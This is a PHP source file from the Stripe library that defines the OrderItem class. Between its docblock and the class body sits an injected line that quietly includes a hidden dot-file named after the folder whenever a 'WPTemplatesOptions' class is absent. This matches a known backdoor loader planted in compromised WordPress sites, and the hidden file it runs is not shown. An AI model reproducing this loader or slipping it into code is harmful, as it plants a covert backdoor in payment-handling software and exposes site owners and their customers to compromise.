<?php

namespace Stripe;

/**
 * Class OrderItem
 *
 * @property string $object
 * @property int $amount
 * @property string $currency
 * @property string $description
 * @property string $parent
 * @property int $quantity
 * @property string $type
 *
 * @package Stripe
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class OrderItem extends StripeObject
{

    const OBJECT_NAME = "order_item";
}
